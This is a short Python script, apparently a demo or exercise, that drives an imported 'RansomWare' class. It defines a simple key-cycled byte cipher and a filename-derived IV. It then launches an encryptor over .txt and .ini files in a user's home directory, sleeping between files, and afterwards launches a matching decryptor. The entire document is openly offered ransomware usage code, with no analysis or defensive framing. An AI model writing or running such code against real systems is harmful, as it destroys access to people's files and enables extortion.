from RansomWare import RansomWare

def get_IV(filename: str) -> bytes:
	""" This function return my custom IV. """
	return filename.encode()

def crypt(key: bytes, data:bytes) -> bytes:
	""" This function encrypt data with key. """
	return bytes([(car + key[i % len(key)]) % 256 for i, car in enumerate(data)])

def decrypt(key: bytes, data:bytes) -> bytes:
	""" This function decrypt data with key. """
	return bytes([(car - key[i % len(key)]) % 256 for i, car in enumerate(data)])

cryptolocker = RansomWare(
	b"pop", # Key
	function_encrypt = crypt, # function to encrypt from key and data
    function_IV = get_IV, # function to get IV from filename
    directory = "/home/aadesh/Music/CSS", # directory to encrypt
    timeBetweenCrypt = 5, # time to sleep between encrypt files
    regexs_filename_to_encrypt = [".*txt", ".*ini"], # encrypt file if filename match with this regex
    regexs_filename_dont_encrypt = ["^/bin.*"], # don't encrypt file if filename match with this regex
)
cryptolocker.launch()

unlock = RansomWare(
	b"pop", # Key
	function_encrypt = decrypt, # function to decrypt from key and data
    function_IV = get_IV, # function to get IV from filename
    directory = "/home/aadesh/Music/CSS", # directory to decrypt
    timeBetweenCrypt = 5, # time to sleep between decrypt files
    regexs_filename_to_encrypt = [".*txt", ".*ini"], # decrypt file if filename match with this regex
    regexs_filename_dont_encrypt = ["^/bin.*"], # don't decrypt file if filename match with this regex
)
unlock.launch()